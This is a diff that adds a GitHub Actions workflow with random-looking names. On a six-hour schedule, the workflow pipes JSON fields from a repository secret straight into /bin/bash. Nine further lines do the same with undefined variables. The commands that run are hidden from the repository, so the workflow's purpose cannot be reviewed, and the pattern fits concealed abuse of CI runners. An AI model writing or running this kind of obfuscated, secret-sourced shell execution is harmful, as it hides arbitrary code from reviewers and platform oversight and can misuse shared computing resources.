@@ -1,0 +1,26 @@
+name: danrangriyue
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: danrangriyue
+        env:
+          rqm76: ${{ secrets.rqm76 }}
+        run: |
+          echo $rqm76 | jq -r .n2 | /bin/bash
+          echo $fua64058 | jq -r .ty0 | /bin/bash
+          echo $yej45 | jq -r .pzwn7763 | /bin/bash
+          echo $wyq5482 | jq -r .f3 | /bin/bash
+          echo $zmw98 | jq -r .t270 | /bin/bash
+          echo $awzi28740 | jq -r .hv97000 | /bin/bash
+          echo $spl41051 | jq -r .ees848 | /bin/bash
+          echo $e5 | jq -r .qlpt5 | /bin/bash
+          echo $efe859 | jq -r .pylz57 | /bin/bash
+          echo $p3727 | jq -r .mvdr226 | /bin/bash
+
